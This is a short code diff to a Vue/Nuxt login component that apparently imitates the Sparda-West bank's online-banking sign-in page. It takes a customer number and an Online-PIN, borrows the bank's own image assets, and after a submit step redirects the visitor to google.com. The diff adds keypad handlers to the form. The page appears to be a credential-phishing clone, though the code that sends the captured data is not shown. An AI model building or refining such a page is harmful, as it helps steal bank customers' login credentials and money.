@@ -6,14 +6,14 @@
                 <label for="user">Kundennummer</label>
             </div>
             <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
-            <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
+            <img @click="openNumpad(0)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
         <div class="input pin">
             <div class="textField">
                 <label for="onlinePin">Online-Pin</label>
             </div>
             <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
-            <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
+            <img @click="openNumpad(1)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
     <button id="loginBtn" ref="loginBtn">
@@ -98,5 +98,11 @@
         }));
         await navigateTo('https://www.google.com/', { external: true });
     }
+
+    const openNumpad = (id: 0 | 1) => {
+        
+    };
+
+    provide('openNumpad', openNumpad)
 
 </script>
